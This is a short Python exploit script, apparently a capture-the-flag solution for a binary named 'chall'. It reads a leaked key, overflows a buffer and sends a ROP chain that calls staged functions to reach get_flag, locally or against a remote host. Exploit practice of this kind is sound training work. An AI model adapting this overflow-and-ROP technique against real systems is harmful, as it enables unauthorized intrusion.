#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''

b*vulnerable+66
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

def exploit():

    ru(b'key: ')
    leak = int(rl()[:-1], 16)
    slog('Leak',leak)

    ret = 0x000000000040101a
    pop_rdi = 0x0000000000401565

    pl = flat(
        cyclic(0x18),
        ret,
        pop_rdi,
        leak ^ 0xCAFEBABE,
        exe.sym.execute_stage1,

        ret,
        pop_rdi,
        0xCAFEBABE^0xF00DBABE,
        exe.sym.execute_stage2,
        
        ret,
        pop_rdi,
        0xf00dbabe^0x12345678,
        exe.sym.get_flag,
        )
    
    sa(b'Input: ', pl)
    interactive()

if __name__ == '__main__':
    exploit()
